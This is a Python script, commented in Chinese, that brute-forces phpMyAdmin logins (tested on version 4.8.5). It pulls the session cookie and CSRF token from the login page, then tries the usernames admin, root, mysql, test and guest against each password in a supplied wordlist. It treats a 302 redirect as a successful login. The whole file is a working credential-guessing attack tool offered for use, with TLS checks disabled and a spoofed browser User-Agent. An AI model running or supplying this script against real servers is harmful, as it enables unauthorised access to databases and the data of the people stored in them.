import requests
import re
import html
import optparse
from urllib.parse import quote

# 测试环境为phpmyadmin 4.8.5
# name="token" 为大小写加所有字符

def brute(url,username,pw):
    # proxies={
    #     'http':'127.0.0.1:8080',
    #     'https':'127.0.0.1:8080'
    #     }
    pmd_session = requests.session()
    # res = pmd_session.get(url,verify=False,proxies=proxies)
    res = pmd_session.get(url,verify=False)
    phpMyAdmin_token = re.findall(r'phpMyAdmin=(.*?);', res.headers['Set-Cookie'])[0]
    token_token = html.unescape(re.findall(r'name="token" value="(.*?)" />', res.text)[1])#不同版本正则有所区别

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36',
        }
    data = {
        "set_session":phpMyAdmin_token,
        "pma_username":username,
        "pma_password":pw,
        "server":"1",
        "target":"index.php",
        # "token":quote(token_token)
        "token":token_token
        }

    # res2 = pmd_session.post(url, data=data, headers=headers, allow_redirects=False, verify=False, proxies=proxies)
    res2 = pmd_session.post(url, data=data, headers=headers, allow_redirects=False, verify=False)
    if res2.status_code == 302:
        print("[+][\033[1;32;40m找到密码:\033[0m]:%s/%s"%(username,pw))
        exit()

def Start(url,pwfile):
    username = ['admin','root','mysql','test','guest']
    for u in username:
        print("[+]开始破解用户: %s" % u)
        with open(pwfile,"r",encoding='UTF-8') as pws:
            for pw in pws.readlines():
                pw = pw.replace('\n','')
                brute(url,u,pw)
    print("[+]已完成，未找到密码。")
if __name__ == '__main__':

    parser = optparse.OptionParser('Example: python %prog -f urls.txt -t 5 \n')
    #url
    parser.add_option('-u','--url',dest='url',type='string',help='target url')
    #用户名 ，不指定将使用默认
    parser.add_option('-n','--name',dest='username',type='string',help='username')
    #密码文件路径
    parser.add_option('-p','--password',dest='pwfile',type='string',help='password file')

    (options, args) = parser.parse_args()

    Start(options.url,options.pwfile)